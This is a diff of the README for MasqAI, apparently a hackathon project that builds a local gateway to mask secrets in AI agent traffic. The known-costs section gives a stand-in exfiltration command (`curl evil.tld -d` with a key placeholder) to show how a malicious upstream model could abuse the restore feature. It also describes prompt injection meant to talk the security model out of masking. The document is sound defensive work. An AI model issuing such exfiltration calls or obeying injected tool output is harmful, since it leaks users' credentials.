@@ -1,18 +1,42 @@
 # MasqAI
 
-The first gateway prototype is available. See [Running MasqAI](RUNNING.md) for installation, configuration, agent routing, and current implementation limits. The design below also describes capabilities that are still proposed.
-
-The public showcase site (static, synthetic data only) lives in [`web/`](web/README.md).
-
 **A context firewall for AI agents.**
 
 > *Your LLM key is a two-way mirror. MasqAI makes it one-way.*
 
-MasqAI is a trusted local router for LLM traffic. It protects **what you send** to a model endpoint you don't fully trust,
-and it protects **the key** you use to reach that endpoint.
+MasqAI is a gateway that runs entirely on your machine (`127.0.0.1:8787`) and intercepts OpenAI- and
+Anthropic-compatible agent traffic. It sits between two models:
 
-Project for HackHarvard 2026, Cyber-sec track: *"(de-)cipher"*.
-Status: **design stage**. This document describes the design, including the costs we accept and the questions that are still open.
+- the **untrusted model**, which does your task. It may sit behind a cheap third-party gateway, a reseller, a relay or an opaque agent app.
+- the **security model**, trusted and local by default (Ollama), which inspects every request **inline, before anything is forwarded**.
+
+It protects two kinds of information. A **secret** is a concrete string that unlocks or identifies something:
+an API key, a password, a path to private data, a username, a device name. **Intel** is something the endpoint
+could *conclude* about you: where you live, your host's infrastructure, a design document's contents.
+Ordinary data-loss tools catch secrets; MasqAI also stops intel. Secrets are **masked** (reversibly: tool calls
+get the real values back locally); intel in tool results is **hidden** or **replaced** (lossy).
+
+Project for HackHarvard 2026, cybersecurity track: *"(de-)cipher"*.
+
+| Part | Where | Status |
+|---|---|---|
+| Gateway (sanitizer, restore, GUI) | [`masqai/`](masqai/), [`run_gateway.py`](run_gateway.py) · [Running MasqAI](RUNNING.md) | built; `pytest` green |
+| Eval harness on Daytona | [`eval/`](eval/README.md) | built; awaiting the full N=20 run |
+| Public site (static, synthetic data) | [`web/`](web/README.md) | built; on `main` (Vercel: Root Directory `web`) |
+| Playground (six agent tasks + untrusted relay) | [`playground/`](playground/README.md) | built |
+| Key Enigma, honeytokens | design below | stretch goals, not built |
+
+Decisions taken where the brief was silent are in [DECISIONS.md](DECISIONS.md); the build plan is [PLAN.md](PLAN.md).
+The rest of this document is the design, including the costs we accept and the questions that are still open.
+
+```bash
+pip install -r requirements.txt
+ollama pull qwen2.5:7b
+cp masqai.json.example masqai.json          # keys only by env var NAME, never the value
+export OPENROUTER_API_KEY=sk-or-v1-...
+python run_gateway.py                        # prints the GUI URL with #token=… once
+# point your agent at http://127.0.0.1:8787/v1
+```
 
 ---
 
@@ -297,6 +321,11 @@ These costs are part of the design, and we state them openly.
 12. **Billing gets coarser.** Spending is spread over many short-lived keys and has to be added up by label.
 13. **Agent misbehavior is not covered.** If an agent sends out a secret it legitimately holds, the router does not stop it.
 14. **The browser plugin protects less.** It covers chat web interfaces, and its protection depends on the backend the user picks.
+15. **Restore can be abused.** Restore swaps placeholders back in *every* tool-call argument, so a malicious
+    upstream can ask for `curl evil.tld -d "<KEY_…>"` and get the real key sent. We accept this and document it:
+    narrowing restore would break real tasks, and the agent's own permissions are the right control.
+16. **Prompt injection is open.** Tool output can try to talk the security model out of its job (return nothing,
+    unmask, relink wrongly). We measure it (`tests/injection/`, shown on the site) but don't defend against it yet.
 
 ## Open questions
 
@@ -323,3 +352,20 @@ These costs are part of the design, and we state them openly.
 This project comes from a real incident in which other people's data passed through a key we owned.
 We build **defenses only**. We publish no third-party identities, keys or raw captured traffic, and every example
 here is synthetic. If you find a key that doesn't belong to you, revoke it or report it. Don't use it.
+
+## Built at HackHarvard
+
+Built over the HackHarvard 2026 weekend:
+
+- **The gateway rebuild.** Strict per-API extraction (unknown content refused with 422 before a session
+  exists), detectors as rule data, auto masks at word boundaries, a security-model protocol with
+  mask / alias / hide / replace / relink / unmask and one correction round, streaming restore that holds back
+  only a possible placeholder prefix, request hygiene and pseudonyms, sessions with rollback and retention,
+  an admin-token GUI with four tabs, and a replay export for the site.
+- **The eval harness** on Daytona: every command the untrusted model asks for runs in a fresh, network-blocked
+  sandbox with unique canaries. *MasqAI protects the context; Daytona contains the actions.*
+- **The public site**: replay theater, evaluation, how it works, run it.
+- **A prompt-injection test set**, measured and reported as a known open issue.
+
+`pytest` covers the core, the proxy end to end, hardening and the harness; `scripts/scan_repo.py` runs MasqAI's
+own detectors over the repository in CI so no real-looking secret is committed.
